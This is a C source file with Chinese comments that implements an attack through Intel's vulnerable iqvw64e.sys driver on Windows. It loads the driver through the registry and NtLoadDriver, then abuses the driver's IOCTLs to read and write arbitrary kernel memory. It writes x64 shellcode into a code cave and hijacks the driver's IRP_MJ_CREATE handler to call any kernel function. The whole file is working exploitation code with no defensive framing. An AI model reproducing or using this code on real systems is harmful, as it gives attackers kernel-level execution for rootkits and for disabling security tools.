#include "intel_driver.h"
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

/* ------------------------------------------------------------------ */
/*  全局状态                                                          */
/* ------------------------------------------------------------------ */

static HANDLE g_IntelDevice = INVALID_HANDLE_VALUE;
static WCHAR  g_ServiceRegPath[512] = { 0 };

/* ntdll 函数指针 */
static PFN_NtLoadDriver             pNtLoadDriver;
static PFN_NtUnloadDriver           pNtUnloadDriver;
static PFN_NtQuerySystemInformation  pNtQuerySystemInformation;
static PFN_RtlInitUnicodeString      pRtlInitUnicodeString;
static PFN_RtlAdjustPrivilege        pRtlAdjustPrivilege;

/* ------------------------------------------------------------------ */
/*  初始化 ntdll 函数                                                 */
/* ------------------------------------------------------------------ */

static BOOL
InitNtFunctions(void)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;

    pNtLoadDriver   = (PFN_NtLoadDriver)GetProcAddress(ntdll, "NtLoadDriver");
    pNtUnloadDriver = (PFN_NtUnloadDriver)GetProcAddress(ntdll, "NtUnloadDriver");
    pNtQuerySystemInformation = (PFN_NtQuerySystemInformation)
        GetProcAddress(ntdll, "NtQuerySystemInformation");
    pRtlInitUnicodeString = (PFN_RtlInitUnicodeString)
        GetProcAddress(ntdll, "RtlInitUnicodeString");
    pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)
        GetProcAddress(ntdll, "RtlAdjustPrivilege");

    return pNtLoadDriver && pNtUnloadDriver &&
           pNtQuerySystemInformation && pRtlInitUnicodeString;
}

/* ------------------------------------------------------------------ */
/*  权限提升 (SeLoadDriverPrivilege)                                  */
/* ------------------------------------------------------------------ */

static BOOL
EnableLoadDriverPrivilege(void)
{
    if (!pRtlAdjustPrivilege) return FALSE;
    BOOLEAN wasEnabled;
    /* SE_LOAD_DRIVER_PRIVILEGE = 10 */
    NTSTATUS st = pRtlAdjustPrivilege(10, TRUE, FALSE, &wasEnabled);
    return st >= 0;
}

/* ------------------------------------------------------------------ */
/*  服务注册表创建/删除                                               */
/* ------------------------------------------------------------------ */

static BOOL
CreateDriverService(LPCWSTR DriverPath, LPCWSTR ServiceName)
{
    HKEY hKey = NULL;
    WCHAR regPath[512];
    wsprintfW(regPath,
              L"SYSTEM\\CurrentControlSet\\Services\\%s", ServiceName);
    wsprintfW(g_ServiceRegPath,
              L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%s",
              ServiceName);

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
                        NULL, &hKey, NULL) != ERROR_SUCCESS)
        return FALSE;

    DWORD dwType  = 1;  /* SERVICE_KERNEL_DRIVER */
    DWORD dwStart = 3;  /* SERVICE_DEMAND_START */
    DWORD dwError = 1;  /* SERVICE_ERROR_NORMAL */

    /* ImagePath 使用 \??\ 前缀的 NT 路径 */
    WCHAR ntPath[MAX_PATH + 8];
    wsprintfW(ntPath, L"\\??\\%s", DriverPath);

    RegSetValueExW(hKey, L"ImagePath",    0, REG_EXPAND_SZ,
                   (BYTE *)ntPath, (DWORD)(wcslen(ntPath) + 1) * sizeof(WCHAR));
    RegSetValueExW(hKey, L"Type",         0, REG_DWORD, (BYTE *)&dwType,  4);
    RegSetValueExW(hKey, L"Start",        0, REG_DWORD, (BYTE *)&dwStart, 4);
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE *)&dwError, 4);

    RegCloseKey(hKey);
    return TRUE;
}

static void
DeleteDriverService(LPCWSTR ServiceName)
{
    WCHAR regPath[512];
    wsprintfW(regPath,
              L"SYSTEM\\CurrentControlSet\\Services\\%s", ServiceName);
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, regPath);
}

/* ------------------------------------------------------------------ */
/*  漏洞驱动加载/卸载                                                 */
/* ------------------------------------------------------------------ */

BOOL
IntelLoadDriver(LPCWSTR DriverPath)
{
    if (!InitNtFunctions()) {
        printf("[-] 无法解析 ntdll 函数\n");
        return FALSE;
    }

    if (!EnableLoadDriverPrivilege()) {
        printf("[-] 提权失败，需要管理员权限\n");
        return FALSE;
    }

    /* 确保漏洞驱动文件存在 */
    if (GetFileAttributesW(DriverPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] 找不到漏洞驱动: %ls\n", DriverPath);
        return FALSE;
    }

    DeleteDriverService(INTEL_DRIVER_SVC_NAME);

    if (!CreateDriverService(DriverPath, INTEL_DRIVER_SVC_NAME)) {
        printf("[-] 创建驱动服务失败\n");
        return FALSE;
    }

    UNICODE_STRING usRegPath;
    pRtlInitUnicodeString(&usRegPath, g_ServiceRegPath);

    NTSTATUS st = pNtLoadDriver(&usRegPath);
    if (st < 0 && st != (NTSTATUS)0xC0000603 /* STATUS_IMAGE_ALREADY_LOADED */) {
        printf("[-] NtLoadDriver 失败: 0x%08lX\n", (ULONG)st);
        DeleteDriverService(INTEL_DRIVER_SVC_NAME);
        return FALSE;
    }

    printf("[+] iqvw64e.sys 加载成功\n");
    return TRUE;
}

BOOL
IntelUnloadDriver(void)
{
    IntelCloseDevice();

    if (pNtUnloadDriver && g_ServiceRegPath[0]) {
        UNICODE_STRING usRegPath;
        pRtlInitUnicodeString(&usRegPath, g_ServiceRegPath);
        pNtUnloadDriver(&usRegPath);
    }

    DeleteDriverService(INTEL_DRIVER_SVC_NAME);
    printf("[+] iqvw64e.sys 已卸载\n");
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  设备句柄管理                                                      */
/* ------------------------------------------------------------------ */

BOOL
IntelOpenDevice(void)
{
    g_IntelDevice = CreateFileW(
        INTEL_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (g_IntelDevice == INVALID_HANDLE_VALUE) {
        printf("[-] 打开 Nal 设备失败: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

void IntelCloseDevice(void)
{
    if (g_IntelDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(g_IntelDevice);
        g_IntelDevice = INVALID_HANDLE_VALUE;
    }
}

HANDLE IntelGetDevice(void) { return g_IntelDevice; }

/* ------------------------------------------------------------------ */
/*  IOCTL 原语                                                        */
/* ------------------------------------------------------------------ */

static BOOL
SendIoctl(PVOID Buffer, DWORD Size)
{
    DWORD ret = 0;
    return DeviceIoControl(g_IntelDevice, INTEL_IOCTL,
                           Buffer, Size, Buffer, Size, &ret, NULL);
}

ULONG64
IntelMapIoSpace(ULONG64 PhysAddr, ULONG Size)
{
    INTEL_MAP_IO_SPACE buf = { 0 };
    buf.Op       = INTEL_OP_MAP_IO_SPACE;
    buf.PhysAddr = PhysAddr;
    buf.Size     = Size;
    if (!SendIoctl(&buf, sizeof(buf))) return 0;
    return buf.OutPtr;
}

BOOL
IntelUnmapIoSpace(ULONG64 Addr, ULONG Size)
{
    INTEL_UNMAP_IO_SPACE buf = { 0 };
    buf.Op       = INTEL_OP_UNMAP_IO_SPACE;
    buf.VirtAddr = Addr;
    buf.Size     = Size;
    return SendIoctl(&buf, sizeof(buf));
}

ULONG64
IntelGetPhysAddr(ULONG64 VirtAddr)
{
    INTEL_GET_PHYS_ADDR buf = { 0 };
    buf.Op       = INTEL_OP_GET_PHYS_ADDR;
    buf.VirtAddr = VirtAddr;
    if (!SendIoctl(&buf, sizeof(buf))) return 0;
    return buf.ReturnPhysAddr;
}

BOOL
IntelMemCopy(ULONG64 Dst, ULONG64 Src, ULONG64 Size)
{
    INTEL_MEMCOPY buf = { 0 };
    buf.Op   = INTEL_OP_MEMCOPY;
    buf.Dst  = Dst;
    buf.Src  = Src;
    buf.Size = Size;
    return SendIoctl(&buf, sizeof(buf));
}

/* ------------------------------------------------------------------ */
/*  内核虚拟内存读写                                                  */
/*  GetPhysicalAddress → MapIoSpace → 读写 → UnmapIoSpace             */
/* ------------------------------------------------------------------ */

BOOL
IntelReadKernel(ULONG64 KernelAddr, PVOID Buffer, ULONG Size)
{
    if (!Size) return FALSE;

    ULONG64 pa = IntelGetPhysAddr(KernelAddr);
    if (!pa) return FALSE;

    ULONG pageOff = (ULONG)(pa & 0xFFF);
    ULONG64 paBase = pa & ~0xFFFULL;
    ULONG mapSize  = pageOff + Size;

    ULONG64 mapped = IntelMapIoSpace(paBase, mapSize);
    if (!mapped) return FALSE;

    memcpy(Buffer, (PVOID)(mapped + pageOff), Size);
    IntelUnmapIoSpace(mapped, mapSize);
    return TRUE;
}

BOOL
IntelWriteKernel(ULONG64 KernelAddr, PVOID Buffer, ULONG Size)
{
    if (!Size) return FALSE;

    ULONG64 pa = IntelGetPhysAddr(KernelAddr);
    if (!pa) return FALSE;

    ULONG pageOff = (ULONG)(pa & 0xFFF);
    ULONG64 paBase = pa & ~0xFFFULL;
    ULONG mapSize  = pageOff + Size;

    ULONG64 mapped = IntelMapIoSpace(paBase, mapSize);
    if (!mapped) return FALSE;

    memcpy((PVOID)(mapped + pageOff), Buffer, Size);
    IntelUnmapIoSpace(mapped, mapSize);
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  查询内核模块基址                                                  */
/* ------------------------------------------------------------------ */

ULONG64
IntelGetKernelModuleBase(LPCSTR ModuleName, PULONG OutSize)
{
    ULONG needed = 0;
    pNtQuerySystemInformation(SystemModuleInformation, NULL, 0, &needed);
    if (!needed) return 0;

    PRTL_PROCESS_MODULES mods = (PRTL_PROCESS_MODULES)malloc(needed);
    if (!mods) return 0;

    NTSTATUS st = pNtQuerySystemInformation(
        SystemModuleInformation, mods, needed, &needed);
    if (st < 0) { free(mods); return 0; }

    ULONG64 base = 0;
    for (ULONG i = 0; i < mods->NumberOfModules; i++) {
        PRTL_PROCESS_MODULE_INFORMATION m = &mods->Modules[i];
        LPCSTR name = (LPCSTR)(m->FullPathName + m->OffsetToFileName);
        if (_stricmp(name, ModuleName) == 0) {
            base = (ULONG64)m->ImageBase;
            if (OutSize) *OutSize = m->ImageSize;
            break;
        }
    }
    free(mods);
    return base;
}

/* ------------------------------------------------------------------ */
/*  解析内核模块导出函数                                              */
/*  从磁盘加载 PE 解析导出表，加上内核基址得到真实地址                 */
/* ------------------------------------------------------------------ */

ULONG64
IntelGetKernelExport(ULONG64 ModuleBase, LPCSTR ExportName)
{
    /* 读取 DOS + NT 头 */
    IMAGE_DOS_HEADER dos;
    if (!IntelReadKernel(ModuleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt;
    if (!IntelReadKernel(ModuleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    IMAGE_DATA_DIRECTORY expDir =
        nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.VirtualAddress || !expDir.Size) return 0;

    /* 读取导出目录 */
    IMAGE_EXPORT_DIRECTORY exp;
    ULONG64 expVA = ModuleBase + expDir.VirtualAddress;
    if (!IntelReadKernel(expVA, &exp, sizeof(exp))) return 0;

    /* 读取 Names / Ordinals / Functions 数组 */
    ULONG count = exp.NumberOfNames;
    if (!count) return 0;

    ULONG64 result = 0;
    PULONG names   = (PULONG)malloc(count * sizeof(ULONG));
    PUSHORT ords   = (PUSHORT)malloc(count * sizeof(USHORT));
    PULONG  funcs  = (PULONG)malloc(exp.NumberOfFunctions * sizeof(ULONG));
    if (!names || !ords || !funcs) goto fail;

    if (!IntelReadKernel(ModuleBase + exp.AddressOfNames,
                         names, count * sizeof(ULONG)))
        goto fail;
    if (!IntelReadKernel(ModuleBase + exp.AddressOfNameOrdinals,
                         ords, count * sizeof(USHORT)))
        goto fail;
    if (!IntelReadKernel(ModuleBase + exp.AddressOfFunctions,
                         funcs, exp.NumberOfFunctions * sizeof(ULONG)))
        goto fail;

    /* 查找目标导出 */
    for (ULONG i = 0; i < count; i++) {
        CHAR funcName[256] = { 0 };
        IntelReadKernel(ModuleBase + names[i], funcName, sizeof(funcName) - 1);
        if (strcmp(funcName, ExportName) == 0) {
            result = ModuleBase + funcs[ords[i]];
            break;
        }
    }

fail:
    free(names);
    free(ords);
    free(funcs);
    return result;
}

/* ------------------------------------------------------------------ */
/*  查找 iqvw64e.sys 的 DRIVER_OBJECT                                 */
/*  通过系统句柄表定位 FILE_OBJECT → DEVICE_OBJECT → DRIVER_OBJECT    */
/* ------------------------------------------------------------------ */

ULONG64
IntelFindDriverObject(void)
{
    ULONG64 fileObj = 0;
    DWORD myPid = GetCurrentProcessId();
    ULONG_PTR myHandle = (ULONG_PTR)g_IntelDevice;

    /* 枚举系统句柄表 */
    ULONG needed = 0;
    pNtQuerySystemInformation(SystemHandleInformationEx, NULL, 0, &needed);
    needed += 0x10000;

    PSYSTEM_HANDLE_INFORMATION_EX info =
        (PSYSTEM_HANDLE_INFORMATION_EX)malloc(needed);
    if (!info) return 0;

    NTSTATUS st = pNtQuerySystemInformation(
        SystemHandleInformationEx, info, needed, &needed);
    if (st < 0) { free(info); return 0; }

    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX e = &info->Handles[i];
        if (e->UniqueProcessId == myPid && e->HandleValue == myHandle) {
            fileObj = (ULONG64)e->Object;
            break;
        }
    }
    free(info);

    if (!fileObj) return 0;

    /* FILE_OBJECT → DeviceObject → DriverObject */
    ULONG64 devObj = 0, drvObj = 0;
    if (!IntelReadKernel(fileObj + FILE_OBJECT_DEVICE_OFFSET, &devObj, 8))
        return 0;
    if (!IntelReadKernel(devObj + DEVICE_OBJECT_DRIVER_OFFSET, &drvObj, 8))
        return 0;

    return drvObj;
}

/* ------------------------------------------------------------------ */
/*  调用内核函数                                                      */
/*  原理：在 iqvw64e.sys 代码段写入 shellcode，                       */
/*  替换 MajorFunction[IRP_MJ_CREATE]，打开新句柄触发执行             */
/* ------------------------------------------------------------------ */

/*
 * Shellcode 布局 (x64):
 *   sub  rsp, 0x28             ; 影子空间
 *   mov  rcx, <arg1>           ; 10 byte mov r64, imm64
 *   mov  rdx, <arg2>
 *   mov  r8,  <arg3>
 *   mov  r9,  <arg4>
 *   mov  rax, <func_addr>
 *   call rax
 *   mov  [rip + result], rax   ; 保存返回值
 *   add  rsp, 0x28
 *   xor  eax, eax              ; STATUS_SUCCESS
 *   ret
 * result:
 *   dq 0
 */

static const BYTE g_ShellcodeTemplate[] = {
    0x48, 0x83, 0xEC, 0x28,                                     /* sub rsp,0x28          */
    0x48, 0xB9, 0,0,0,0,0,0,0,0,                                /* mov rcx, imm64 [+6]   */
    0x48, 0xBA, 0,0,0,0,0,0,0,0,                                /* mov rdx, imm64 [+16]  */
    0x49, 0xB8, 0,0,0,0,0,0,0,0,                                /* mov r8,  imm64 [+26]  */
    0x49, 0xB9, 0,0,0,0,0,0,0,0,                                /* mov r9,  imm64 [+36]  */
    0x48, 0xB8, 0,0,0,0,0,0,0,0,                                /* mov rax, imm64 [+46]  */
    0xFF, 0xD0,                                                  /* call rax               */
    0x48, 0x89, 0x05, 0x07, 0x00, 0x00, 0x00,                   /* mov [rip+7], rax       */
    0x48, 0x83, 0xC4, 0x28,                                     /* add rsp, 0x28          */
    0x33, 0xC0,                                                  /* xor eax, eax           */
    0xC3,                                                        /* ret                    */
    /* +68: result (8 bytes) */
    0,0,0,0,0,0,0,0
};

#define SC_OFF_ARG1     6
#define SC_OFF_ARG2     16
#define SC_OFF_ARG3     26
#define SC_OFF_ARG4     36
#define SC_OFF_FUNC     46
#define SC_OFF_RESULT   68
#define SC_TOTAL_SIZE   76

BOOL
IntelCallKernel(
    ULONG64  FuncAddr,
    ULONG64  Arg1,
    ULONG64  Arg2,
    ULONG64  Arg3,
    ULONG64  Arg4,
    PULONG64 RetVal)
{
    /* 1. 找到 iqvw64e 模块基址 */
    ULONG modSize = 0;
    ULONG64 intelBase = IntelGetKernelModuleBase("iqvw64e.sys", &modSize);
    if (!intelBase) {
        printf("[-] 找不到 iqvw64e.sys 模块\n");
        return FALSE;
    }

    /* 2. 找到 DRIVER_OBJECT */
    ULONG64 drvObj = IntelFindDriverObject();
    if (!drvObj) {
        printf("[-] 找不到 DRIVER_OBJECT\n");
        return FALSE;
    }

    /* 3. 选择代码洞 (模块尾部 padding，距末尾 0x200) */
    ULONG64 caveAddr = intelBase + modSize - 0x200;

    /* 4. 保存原始字节 */
    BYTE origBytes[SC_TOTAL_SIZE];
    if (!IntelReadKernel(caveAddr, origBytes, sizeof(origBytes)))
        return FALSE;

    /* 5. 构建 shellcode */
    BYTE sc[SC_TOTAL_SIZE];
    memcpy(sc, g_ShellcodeTemplate, SC_TOTAL_SIZE);
    memcpy(sc + SC_OFF_ARG1, &Arg1,     8);
    memcpy(sc + SC_OFF_ARG2, &Arg2,     8);
    memcpy(sc + SC_OFF_ARG3, &Arg3,     8);
    memcpy(sc + SC_OFF_ARG4, &Arg4,     8);
    memcpy(sc + SC_OFF_FUNC, &FuncAddr, 8);

    /* 6. 写入 shellcode */
    if (!IntelWriteKernel(caveAddr, sc, SC_TOTAL_SIZE)) {
        printf("[-] 写入 shellcode 失败\n");
        return FALSE;
    }

    /* 7. 保存并替换 MajorFunction[IRP_MJ_CREATE] */
    ULONG64 mjCreateAddr = drvObj + DRIVER_OBJECT_MJ_OFFSET +
                           IRP_MJ_CREATE_INDEX * sizeof(ULONG64);
    ULONG64 origHandler = 0;
    IntelReadKernel(mjCreateAddr, &origHandler, 8);
    IntelWriteKernel(mjCreateAddr, &caveAddr, 8);

    /* 8. 打开新句柄触发 IRP_MJ_CREATE → 执行 shellcode */
    HANDLE triggerHandle = CreateFileW(
        INTEL_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    /* 9. 恢复原始 handler */
    IntelWriteKernel(mjCreateAddr, &origHandler, 8);

    /* 10. 读取返回值 */
    ULONG64 result = 0;
    IntelReadKernel(caveAddr + SC_OFF_RESULT, &result, 8);

    /* 11. 恢复原始字节 */
    IntelWriteKernel(caveAddr, origBytes, SC_TOTAL_SIZE);

    if (triggerHandle != INVALID_HANDLE_VALUE)
        CloseHandle(triggerHandle);

    if (RetVal) *RetVal = result;
    return TRUE;
}
